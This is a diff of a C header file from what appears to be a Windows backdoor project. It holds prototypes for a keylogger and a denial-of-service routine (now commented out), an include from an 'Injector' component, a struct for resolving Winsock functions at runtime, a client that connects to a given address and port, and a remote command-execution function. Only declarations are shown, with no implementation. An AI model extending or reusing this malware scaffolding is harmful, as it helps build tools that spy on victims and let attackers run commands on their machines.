@@ -3,6 +3,7 @@
 
 
 #include "../Include/driver/socket.h"
+#include "../../../Injector/Dependencies/parse/parse.h"
 
 #define Exit -2
 #define UNKNOWN 2
@@ -11,9 +12,20 @@
 
 
 int WININIT(void);
+//      char* keylogger(void);
+//      void DOS(void);
 
-char* keylogger(void);
-void DOS(void);
+
+struct functionaddr
+{
+    
+    SOCKET* (function_socket)(int af, int type, int protocol);
+    int* (function_connect)(SOCKET s, const sockaddr* name, int namelen);
+    int* (function_WSAcleanup)(void);
+    int* (function_WSAstartup)(WORD wordedversion, LPWSADATA lpWSAData);
+    
+};
+
 
 enum _USTATUS
 {
@@ -35,7 +47,8 @@ typedef struct
 
 } ClientCTX, *pClientCTX;
 
-pClientCTX CliInit(void);
+struct functionaddr GetFunctionVA(struct functionaddr* funcVA);
+pClientCTX CliInit(const char* inetaddr, const int port);
 SOCKET client_socket(SOCKET Socket);
 SOCKET client_conn(SOCKET Socket, pClientCTX CTX);
 int execmd(SOCKET Socket);
